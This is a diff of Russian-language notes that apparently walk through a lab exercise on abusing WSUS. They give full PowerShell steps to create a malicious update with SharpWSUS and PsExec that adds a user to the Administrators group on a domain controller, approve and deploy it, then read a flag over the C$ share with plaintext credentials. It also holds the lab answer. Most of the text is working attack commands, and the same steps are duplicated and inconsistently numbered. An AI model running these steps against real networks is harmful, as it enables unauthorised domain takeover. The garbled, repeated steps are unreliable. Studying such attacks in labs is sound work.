@@ -721,165 +721,175 @@ DC01 в группе одобрения	$c.GetComputerTargetGroups()
 
 ## !!!!!!!!!!!!!вариант 2!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
 Вариант Б. По шагам руками
+
 Всё на WSUS, PowerShell от администратора. Внутренние адреса не меняются: WSUS 172.20.0.30, DC01 172.20.0.10.
 
 1. Проверка
-powershell
-Copy
-hostname
-whoami
-Get-ChildItem "C:\Tools\SharpWSUS.exe","C:\Tools\sysinternals\PsExec64.exe" -ErrorAction SilentlyContinue | Select-Object FullName,Length
-Test-Path C:\WSUS\WsusContent
 
-2. Создать обновление
-powershell
-Copy
+       hostname
+       whoami
+        Get-ChildItem "C:\Tools\SharpWSUS.exe","C:\Tools\sysinternals\PsExec64.exe" -ErrorAction SilentlyContinue | Select-Object FullName,Length
+        Test-Path C:\WSUS\WsusContent
+
+3. Создать обновление
+
+
 cd C:\Tools
-$out = .\SharpWSUS.exe create /payload:"C:\Tools\sysinternals\PsExec64.exe" /args:"-accepteula -s -d cmd.exe /c net localgroup Administrators filiplain /add" /title:"NewAccountUpdate"
-$id = [regex]::Match(($out -join "`n"), 'updateid:([0-9a-fA-F-]{36})').Groups[1].Value
-"UPDATE ID = $id"
+        
+        $out = .\SharpWSUS.exe create /payload:"C:\Tools\sysinternals\PsExec64.exe" /args:"-accepteula -s -d cmd.exe /c net localgroup Administrators filiplain /add" /title:"NewAccountUpdate"
+        $id = [regex]::Match(($out -join "`n"), 'updateid:([0-9a-fA-F-]{36})').Groups[1].Value
+        "UPDATE ID = $id"
 
-3. Контент (правило: последние 2 символа SHA1 \ полный SHA1.exe)
-powershell
-Copy
-$h = (Get-FileHash "C:\Tools\sysinternals\PsExec64.exe" -Algorithm SHA1).Hash
-"payload SHA1 = $h"
-$dest = "C:\WSUS\WsusContent\" + $h.Substring($h.Length-2) + "\" + $h + ".exe"
-"основной путь: $dest"
-New-Item -ItemType Directory -Force (Split-Path $dest) | Out-Null
-Copy-Item "C:\Tools\sysinternals\PsExec64.exe" $dest -Force
-Copy-Item "C:\Tools\sysinternals\PsExec64.exe" "C:\WSUS\WsusContent\wuagent.exe" -Force
-"доп. путь:     C:\WSUS\WsusContent\wuagent.exe"
-$rel = $dest.Substring("C:\WSUS\WsusContent\".Length) -replace '\\','/'
-"HTTP основной  = " + (Invoke-WebRequest "http://wsus.inlanefreight.local:8530/Content/$rel" -UseBasicParsing).StatusCode
-"HTTP wuagent   = " + (Invoke-WebRequest "http://wsus.inlanefreight.local:8530/Content/wuagent.exe" -UseBasicParsing).StatusCode
+4. Контент (правило: последние 2 символа SHA1 \ полный SHA1.exe)
 
 
-4. Проверить контент на WSUS
-powershell
-Copy
-[void][reflection.assembly]::LoadWithPartialName("Microsoft.UpdateServices.Administration")
-$wsus = [Microsoft.UpdateServices.Administration.AdminProxy]::GetUpdateServer("WSUS",$false,8530)
-$wsus.ResetAndVerifyContentState()
-$wsus.ResumeAllDownloads()
-"failed downloads = " + $wsus.GetFailedToDownloadUpdatesCount()
+        $h = (Get-FileHash "C:\Tools\sysinternals\PsExec64.exe" -Algorithm SHA1).Hash
+        "payload SHA1 = $h"
+        $dest = "C:\WSUS\WsusContent\" + $h.Substring($h.Length-2) + "\" + $h + ".exe"
+        "основной путь: $dest"
+        New-Item -ItemType Directory -Force (Split-Path $dest) | Out-Null
+        Copy-Item "C:\Tools\sysinternals\PsExec64.exe" $dest -Force
+        Copy-Item "C:\Tools\sysinternals\PsExec64.exe" "C:\WSUS\WsusContent\wuagent.exe" -Force
+        "доп. путь:     C:\WSUS\WsusContent\wuagent.exe"
+        $rel = $dest.Substring("C:\WSUS\WsusContent\".Length) -replace '\\','/'
+        "HTTP основной  = " + (Invoke-WebRequest "http://wsus.inlanefreight.local:8530/Content/$rel" -UseBasicParsing).StatusCode
+        "HTTP wuagent   = " + (Invoke-WebRequest "http://wsus.inlanefreight.local:8530/Content/wuagent.exe" -UseBasicParsing).StatusCode
 
 
-5. Группа + DC01 + одобрение (идемпотентно, без duplicate key)
-powershell
-Copy
+5. Проверить контент на WSUS
 
-$groupName = "FastUpdates"
-$g = $wsus.GetComputerTargetGroups() | Where-Object { $_.Name -eq $groupName }
-if (-not $g) { $g = $wsus.CreateComputerTargetGroup($groupName); "группа СОЗДАНА" } else { "группа уже есть" }
-$c = $wsus.GetComputerTargetByName("dc01.inlanefreight.local")
-if (-not ($c.GetComputerTargetGroups() | Where-Object { $_.Id -eq $g.Id })) { $g.AddComputerTarget($c); "DC01 добавлен" } else { "DC01 уже в группе" }
-$u = $wsus.GetUpdate([guid]$id)
-$res = $u.Approve("Install", $g, (Get-Date).AddMinutes(-1))
-"APPROVED action=" + $res.Action + " deadline=" + $res.Deadline
+        [void][reflection.assembly]::LoadWithPartialName("Microsoft.UpdateServices.Administration")
+        $wsus = [Microsoft.UpdateServices.Administration.AdminProxy]::GetUpdateServer("WSUS",$false,8530)
+        $wsus.ResetAndVerifyContentState()
+        $wsus.ResumeAllDownloads()
+        "failed downloads = " + $wsus.GetFailedToDownloadUpdatesCount()
+
+
+6. Группа + DC01 + одобрение (идемпотентно, без duplicate key)
+
+
+        $groupName = "FastUpdates"
+        $g = $wsus.GetComputerTargetGroups() | Where-Object { $_.Name -eq $groupName }
+        if (-not $g) { $g = $wsus.CreateComputerTargetGroup($groupName); "группа СОЗДАНА" } else { "группа уже есть" }
+        $c = $wsus.GetComputerTargetByName("dc01.inlanefreight.local")
+        if (-not ($c.GetComputerTargetGroups() | Where-Object { $_.Id -eq $g.Id })) { $g.AddComputerTarget($c); "DC01 добавлен" } else { "DC01 уже в группе" }
+        $u = $wsus.GetUpdate([guid]$id)
+        $res = $u.Approve("Install", $g, (Get-Date).AddMinutes(-1))
+        "APPROVED action=" + $res.Action + " deadline=" + $res.Deadline
 
 6. Убедиться, что одобрение Active
-powershell
-Copy
 
-Start-Sleep 45
-$u.GetUpdateApprovals() | Format-Table Action, State, Deadline, GoLiveTime -Auto
+
+        Start-Sleep 45
+        $u.GetUpdateApprovals() | Format-Table Action, State, Deadline, GoLiveTime -Auto
 
 7. Ждать флаг, а не статус (5–20 минут)
-powershell
-Copy
-for ($i = 1; $i -le 40; $i++) {
-    cmd /c "net use \\172.20.0.10\IPC$ /delete" 2>$null | Out-Null
-    cmd /c "net use \\172.20.0.10\C$ /delete"   2>$null | Out-Null
-    cmd /c "net use \\172.20.0.10\C$ /user:INLANEFREIGHT\filiplain Password1" 2>$null | Out-Null
-    if (Test-Path "\\172.20.0.10\C$\WSUS\flag.txt") { "ГОТОВО"; Get-Content "\\172.20.0.10\C$\WSUS\flag.txt"; break }
-    "флаг пока недоступен  $(Get-Date -Format HH:mm:ss)"
-    Start-Sleep -Seconds 60
-}
-8. Читать флаг
-powershell
-Copy
-net use \\172.20.0.10\C$ /user:INLANEFREIGHT\filiplain Password1
-Get-Content \\172.20.0.10\C$\WSUS\flag.txt
-9. Проверка результата (надёжная)
-powershell
-Copy
-cmd /c "dir \\172.20.0.10\C$\WSUS"
-Get-Content \\172.20.0.10\C$\WSUS\flag.txt
-Главное, что надо помнить
-Что	Правильно
-Путь контента	WsusContent\<последние 2 символа SHA1>\<полный SHA1>.exe
-Одобрение	только $u.Approve("Install", $g, (Get-Date).AddMinutes(-1)), не SharpWSUS approve повторно
-Доступ к флагу	только через net use с явными кредами (иначе double-hop → Access is denied)
-Индикатор успеха	читаемый флаг / Filiplain в админах DC01, а НЕ SharpWSUS check
-Время ожидания	5–20 минут (цикл клиента ~13–15 мин)
-Ответ: WSUS_Rights_Are_Powerful
+       
+        for ($i = 1; $i -le 40; $i++) {
+        cmd /c "net use \\172.20.0.10\IPC$ /delete" 2>$null | Out-Null
+        cmd /c "net use \\172.20.0.10\C$ /delete"   2>$null | Out-Null
+        cmd /c "net use \\172.20.0.10\C$ /user:INLANEFREIGHT\filiplain Password1" 2>$null | Out-Null
+        if (Test-Path "\\172.20.0.10\C$\WSUS\flag.txt") { "ГОТОВО"; Get-Content "\\172.20.0.10\C$\WSUS\flag.txt"; break }
+        "флаг пока недоступен  $(Get-Date -Format HH:mm:ss)"
+        Start-Sleep -Seconds 60
+    }
+   
+9. Читать флаг
 
-Если нужен новый IP — пришли его, и я смогу сам проверить состояние стенда (у меня 10.129.229.244 и 10.129.32.217 уже отвалились).
+    net use \\172.20.0.10\C$ /user:INLANEFREIGHT\filiplain Password1
+    Get-Content \\172.20.0.10\C$\WSUS\flag.txt
 
-Files changed
+10. Проверка результата (надёжная)
 
-WSUS-Final.ps1Вариант 
+        cmd /c "dir \\172.20.0.10\C$\WSUS"
+        Get-Content \\172.20.0.10\C$\WSUS\flag.txt
+        Главное, что надо помнить
+        Что	Правильно
+        Путь контента	WsusContent\<последние 2 символа SHA1>\<полный SHA1>.exe
+        Одобрение	только $u.Approve("Install", $g, (Get-Date).AddMinutes(-1)), не SharpWSUS approve повторно
+        Доступ к флагу	только через net use с явными кредами (иначе double-hop → Access is denied)
+        Индикатор успеха	читаемый флаг / Filiplain в админах DC01, а НЕ SharpWSUS check
+        Время ожидания	5–20 минут (цикл клиента ~13–15 мин)
+        Ответ: WSUS_Rights_Are_Powerful
+
+        Если нужен новый IP — пришли его, и я смогу сам проверить состояние стенда (у меня 10.129.229.244 и 10.129.32.217 уже отвалились).
+
+        Files changed
+
+    WSUS-Final.ps1Вариант 
 
 
 !!!!!!!!!!!!!Б. По шагам руками
+
 Всё на WSUS, PowerShell от администратора. Внутренние адреса не меняются: WSUS 172.20.0.30, DC01 172.20.0.10.
 
 1. Проверка
+   
+    powershell
+    Copy
+    hostname
+    whoami
+    Get-ChildItem "C:\Tools\SharpWSUS.exe","C:\Tools\sysinternals\PsExec64.exe" -ErrorAction SilentlyContinue | Select-Object FullName,Length
+    Test-Path C:\WSUS\WsusContent
+
+3. Создать обновление
+
+    powershell
+    Copy
+    cd C:\Tools
+    $out = .\SharpWSUS.exe create /payload:"C:\Tools\sysinternals\PsExec64.exe" /args:"-accepteula -s -d cmd.exe /c net localgroup Administrators filiplain /add" /title:"NewAccountUpdate"
+   
+    $id = [regex]::Match(($out -join "`n"), 'updateid:([0-9a-fA-F-]{36})').Groups[1].Value
+    "UPDATE ID = $id"
+
+5. Контент (правило: последние 2 символа SHA1 \ полный SHA1.exe)
 powershell
 Copy
-hostname
-whoami
-Get-ChildItem "C:\Tools\SharpWSUS.exe","C:\Tools\sysinternals\PsExec64.exe" -ErrorAction SilentlyContinue | Select-Object FullName,Length
-Test-Path C:\WSUS\WsusContent
-2. Создать обновление
-powershell
-Copy
-cd C:\Tools
-$out = .\SharpWSUS.exe create /payload:"C:\Tools\sysinternals\PsExec64.exe" /args:"-accepteula -s -d cmd.exe /c net localgroup Administrators filiplain /add" /title:"NewAccountUpdate"
-$id = [regex]::Match(($out -join "`n"), 'updateid:([0-9a-fA-F-]{36})').Groups[1].Value
-"UPDATE ID = $id"
-3. Контент (правило: последние 2 символа SHA1 \ полный SHA1.exe)
-powershell
-Copy
-$h = (Get-FileHash "C:\Tools\sysinternals\PsExec64.exe" -Algorithm SHA1).Hash
-"payload SHA1 = $h"
-$dest = "C:\WSUS\WsusContent\" + $h.Substring($h.Length-2) + "\" + $h + ".exe"
-"основной путь: $dest"
-New-Item -ItemType Directory -Force (Split-Path $dest) | Out-Null
-Copy-Item "C:\Tools\sysinternals\PsExec64.exe" $dest -Force
-Copy-Item "C:\Tools\sysinternals\PsExec64.exe" "C:\WSUS\WsusContent\wuagent.exe" -Force
-"доп. путь:     C:\WSUS\WsusContent\wuagent.exe"
-$rel = $dest.Substring("C:\WSUS\WsusContent\".Length) -replace '\\','/'
-"HTTP основной  = " + (Invoke-WebRequest "http://wsus.inlanefreight.local:8530/Content/$rel" -UseBasicParsing).StatusCode
-"HTTP wuagent   = " + (Invoke-WebRequest "http://wsus.inlanefreight.local:8530/Content/wuagent.exe" -UseBasicParsing).StatusCode
-4. Проверить контент на WSUS
-powershell
-Copy
-[void][reflection.assembly]::LoadWithPartialName("Microsoft.UpdateServices.Administration")
-$wsus = [Microsoft.UpdateServices.Administration.AdminProxy]::GetUpdateServer("WSUS",$false,8530)
-$wsus.ResetAndVerifyContentState()
-$wsus.ResumeAllDownloads()
-"failed downloads = " + $wsus.GetFailedToDownloadUpdatesCount()
-5. Группа + DC01 + одобрение (идемпотентно, без duplicate key)
-powershell
-Copy
-$groupName = "FastUpdates"
-$g = $wsus.GetComputerTargetGroups() | Where-Object { $_.Name -eq $groupName }
-if (-not $g) { $g = $wsus.CreateComputerTargetGroup($groupName); "группа СОЗДАНА" } else { "группа уже есть" }
-$c = $wsus.GetComputerTargetByName("dc01.inlanefreight.local")
-if (-not ($c.GetComputerTargetGroups() | Where-Object { $_.Id -eq $g.Id })) { $g.AddComputerTarget($c); "DC01 добавлен" } else { "DC01 уже в группе" }
-$u = $wsus.GetUpdate([guid]$id)
-$res = $u.Approve("Install", $g, (Get-Date).AddMinutes(-1))
-"APPROVED action=" + $res.Action + " deadline=" + $res.Deadline
-6. Убедиться, что одобрение Active
-powershell
-Copy
-Start-Sleep 45
-$u.GetUpdateApprovals() | Format-Table Action, State, Deadline, GoLiveTime -Auto
-7. Ждать флаг, а не статус (5–20 минут)
-powershell
-Copy
+
+    $h = (Get-FileHash "C:\Tools\sysinternals\PsExec64.exe" -Algorithm SHA1).Hash
+    "payload SHA1 = $h"
+    $dest = "C:\WSUS\WsusContent\" + $h.Substring($h.Length-2) + "\" + $h + ".exe"
+    "основной путь: $dest"
+    New-Item -ItemType Directory -Force (Split-Path $dest) | Out-Null
+    Copy-Item "C:\Tools\sysinternals\PsExec64.exe" $dest -Force
+    Copy-Item "C:\Tools\sysinternals\PsExec64.exe" "C:\WSUS\WsusContent\wuagent.exe" -Force
+    "доп. путь:     C:\WSUS\WsusContent\wuagent.exe"
+    $rel = $dest.Substring("C:\WSUS\WsusContent\".Length) -replace '\\','/'
+    "HTTP основной  = " + (Invoke-WebRequest "http://wsus.inlanefreight.local:8530/Content/$rel" -UseBasicParsing).StatusCode
+    "HTTP wuagent   = " + (Invoke-WebRequest "http://wsus.inlanefreight.local:8530/Content/wuagent.exe" -UseBasicParsing).StatusCode
+
+6. Проверить контент на WSUS
+
+    powershell
+    Copy
+    [void][reflection.assembly]::LoadWithPartialName("Microsoft.UpdateServices.Administration")
+    $wsus = [Microsoft.UpdateServices.Administration.AdminProxy]::GetUpdateServer("WSUS",$false,8530)
+    $wsus.ResetAndVerifyContentState()
+    $wsus.ResumeAllDownloads()
+    "failed downloads = " + $wsus.GetFailedToDownloadUpdatesCount()
+
+7. Группа + DC01 + одобрение (идемпотентно, без duplicate key)
+    powershell
+    Copy
+    $groupName = "FastUpdates"
+    $g = $wsus.GetComputerTargetGroups() | Where-Object { $_.Name -eq $groupName }
+    if (-not $g) { $g = $wsus.CreateComputerTargetGroup($groupName); "группа СОЗДАНА" } else { "группа уже есть" }
+    $c = $wsus.GetComputerTargetByName("dc01.inlanefreight.local")
+    if (-not ($c.GetComputerTargetGroups() | Where-Object { $_.Id -eq $g.Id })) { $g.AddComputerTarget($c); "DC01 добавлен" } else { "DC01 уже в группе" }
+    $u = $wsus.GetUpdate([guid]$id)
+    $res = $u.Approve("Install", $g, (Get-Date).AddMinutes(-1))
+    "APPROVED action=" + $res.Action + " deadline=" + $res.Deadline
+
+8. Убедиться, что одобрение Active
+    powershell
+    Copy
+    Start-Sleep 45
+    $u.GetUpdateApprovals() | Format-Table Action, State, Deadline, GoLiveTime -Auto
+
+9. Ждать флаг, а не статус (5–20 минут)
+    powershell
+    Copy
+   
 for ($i = 1; $i -le 40; $i++) {
     cmd /c "net use \\172.20.0.10\IPC$ /delete" 2>$null | Out-Null
     cmd /c "net use \\172.20.0.10\C$ /delete"   2>$null | Out-Null
@@ -888,12 +898,14 @@ for ($i = 1; $i -le 40; $i++) {
     "флаг пока недоступен  $(Get-Date -Format HH:mm:ss)"
     Start-Sleep -Seconds 60
 }
-8. Читать флаг
+
+11. Читать флаг
 powershell
 Copy
 net use \\172.20.0.10\C$ /user:INLANEFREIGHT\filiplain Password1
 Get-Content \\172.20.0.10\C$\WSUS\flag.txt
-9. Проверка результата (надёжная)
+
+12. Проверка результата (надёжная)
 powershell
 Copy
 cmd /c "dir \\172.20.0.10\C$\WSUS"
@@ -909,7 +921,10 @@ Get-Content \\172.20.0.10\C$\WSUS\flag.txt
 
 Если нужен новый IP — пришли его, и я смогу сам проверить состояние стенда (у меня 10.129.229.244 и 10.129.32.217 уже отвалились).
 
-Files changed
+
+
+
+
 
 powershell -ExecutionPolicy Bypass -File C:\Tools\WSUS-Final.ps1
 WSUS-Final.ps1
